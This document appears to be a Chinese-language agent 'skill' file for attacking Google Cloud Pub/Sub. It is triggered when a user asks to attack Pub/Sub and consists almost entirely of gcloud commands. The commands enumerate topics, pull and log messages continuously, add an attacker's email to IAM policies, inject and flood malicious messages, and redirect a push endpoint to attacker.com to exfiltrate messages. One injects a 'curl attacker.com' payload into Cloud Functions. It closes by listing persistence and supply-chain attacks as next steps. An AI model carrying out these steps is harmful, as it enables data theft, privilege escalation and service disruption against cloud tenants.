---
name: gcp-pubsub-attack
type: attack
category: messaging
platform: gcp
severity: medium
---

# GCP Pub/Sub 攻击技能

## 触发条件

- 有 GCP 凭证
- 目标使用 Pub/Sub
- 用户要求"攻击 Pub/Sub"

## 前置检查

```bash
# 1. 验证凭证
gcloud auth list

# 2. 列出所有 Topic
gcloud pubsub topics list

# 3. 列出所有订阅
gcloud pubsub subscriptions list
```

## 攻击方法

### 方法 1: Topic 枚举

```bash
# 1. 列出所有 Topic
gcloud pubsub topics list

# 2. 获取 Topic 详情
gcloud pubsub topics describe TOPIC_NAME

# 3. 列出 Topic 订阅
gcloud pubsub topics list-subscriptions TOPIC_NAME

# 4. 搜索敏感 Topic
gcloud pubsub topics list | grep -i -E "password|secret|sensitive|private"
```

### 方法 2: 消息窃取

```bash
# 1. 列出所有订阅
gcloud pubsub subscriptions list

# 2. 拉取消息（Pull 订阅）
gcloud pubsub subscriptions pull SUBSCRIPTION_ID --max-messages 10

# 3. 读取消息内容
gcloud pubsub subscriptions pull SUBSCRIPTION_ID --format=json | \
  jq -r '.[].message.data' | base64 -d

# 4. 持续拉取消息
while true; do
  gcloud pubsub subscriptions pull SUBSCRIPTION_ID --max-messages 100
done > /tmp/pubsub-messages.txt
```

### 方法 3: IAM 策略利用

```bash
# 1. 获取 Topic IAM 策略
gcloud pubsub topics get-iam-policy TOPIC_NAME

# 2. 添加自己到策略
gcloud pubsub topics add-iam-policy-binding TOPIC_NAME \
  --member="user:YOUR_EMAIL@gmail.com" \
  --role="roles/pubsub.subscriber"

# 3. 授予发布权限
gcloud pubsub topics add-iam-policy-binding TOPIC_NAME \
  --member="user:YOUR_EMAIL@gmail.com" \
  --role="roles/pubsub.publisher"

# 4. 检查现有权限
gcloud pubsub topics get-iam-policy TOPIC_NAME | \
  jq -r '.bindings[] | select(.role | contains("pubsub"))'
```

### 方法 4: 消息注入

```bash
# 1. 发布恶意消息
gcloud pubsub topics publish TOPIC_NAME "malicious_payload"

# 2. 发布 JSON 消息
echo '{"cmd": "inject", "data": "malicious"}' | \
  gcloud pubsub topics publish TOPIC_NAME

# 3. 发布带属性的消息
gcloud pubsub topics publish TOPIC_NAME \
  --attribute="key1=value1,key2=value2" \
  "message with attributes"

# 4. 批量发布（消息洪泛）
for i in {1..1000}; do
  gcloud pubsub topics publish TOPIC_NAME "spam_$i"
done
```

### 方法 5: Snapshot 利用

```bash
# 1. 创建 Snapshot
gcloud pubsub snapshots create SNAPSHOT_NAME --subscription=SUBSCRIPTION_ID

# 2. 从 Snapshot 创建订阅
gcloud pubsub snapshots seek SNAPSHOT_NAME SUBSCRIPTION_ID

# 3. 查看所有 Snapshot
gcloud pubsub snapshots list

# 4. 删除 Snapshot
gcloud pubsub snapshots delete SNAPSHOT_NAME
```

### 方法 6: Schema 利用

```bash
# 1. 列出所有 Schema
gcloud pubsub schemas list

# 2. 获取 Schema 详情
gcloud pubsub schemas describe SCHEMA_ID

# 3. 提取 Schema 定义
gcloud pubsub schemas describe SCHEMA_ID --format=json | \
  jq -r '.definition'

# 4. Schema 中可能包含敏感信息
gcloud pubsub schemas describe SCHEMA_ID | grep -i "password|secret"
```

### 方法 7: 死信队列利用

```bash
# 1. 获取订阅详情
gcloud pubsub subscriptions describe SUBSCRIPTION_ID

# 2. 检查死信策略
gcloud pubsub subscriptions describe SUBSCRIPTION_ID | \
  jq -r '.deadLetterPolicy'

# 3. 从死信队列读取失败的消息
DLQ_SUB=$(gcloud pubsub subscriptions describe SUBSCRIPTION_ID | \
  jq -r '.deadLetterPolicy.deadLetterTopic')
gcloud pubsub subscriptions pull DLQ_SUB

# 4. 分析失败原因
```

### 方法 8: Push 订阅利用

```bash
# 1. 列出所有 Push 订阅
gcloud pubsub subscriptions list --filter="pushConfig:*"

# 2. 获取 Push 端点
gcloud pubsub subscriptions describe PUSH_SUBSCRIPTION_ID | \
  jq -r '.pushConfig.pushEndpoint'

# 3. 如果是 HTTP/HTTPS 端点
# 可以检查端点是否泄露消息

# 4. 修改 Push 端点（重定向消息）
gcloud pubsub subscriptions update PUSH_SUBSCRIPTION_ID \
  --push-endpoint=https://attacker.com/webhook
```

### 方法 9: Backlog 利用

```bash
# 1. 检查订阅积压
gcloud pubsub subscriptions describe SUBSCRIPTION_ID | \
  jq -r '.messageRetentionDuration'

# 2. 修改保留时长
gcloud pubsub subscriptions update SUBSCRIPTION_ID \
  --message-retention-duration=7d

# 3. 修改 Ack Deadline
gcloud pubsub subscriptions update SUBSCRIPTION_ID \
  --ack-deadline-seconds=600
```

### 方法 10: 与 Cloud Functions 集成利用

```bash
# 1. 检查 Cloud Functions 订阅
gcloud functions list --filter="eventTrigger.eventType=google.pubsub.topic.publish"

# 2. 获取触发器配置
gcloud functions describe FUNCTION_NAME | \
  jq -r '.eventTrigger'

# 3. 获取 Pub/Sub Topic
TOPIC=$(gcloud functions describe FUNCTION_NAME | \
  jq -r '.eventTrigger.resource')

# 4. 发布恶意消息触发 Lambda
gcloud pubsub topics publish $TOPIC '{"cmd": "curl attacker.com"}'
```

## 验证成功

```bash
# 成功列出 Topic
gcloud pubsub topics list

# 成功拉取消息
gcloud pubsub subscriptions pull SUBSCRIPTION_ID

# 成功发布消息
gcloud pubsub topics publish TOPIC_NAME "test"
```

## 下一步

1. 分析窃取的消息内容
2. 通过 Pub/Sub 建立持久化通信
3. 攻击订阅的 Cloud Functions
4. 利用消息队列进行供应链攻击
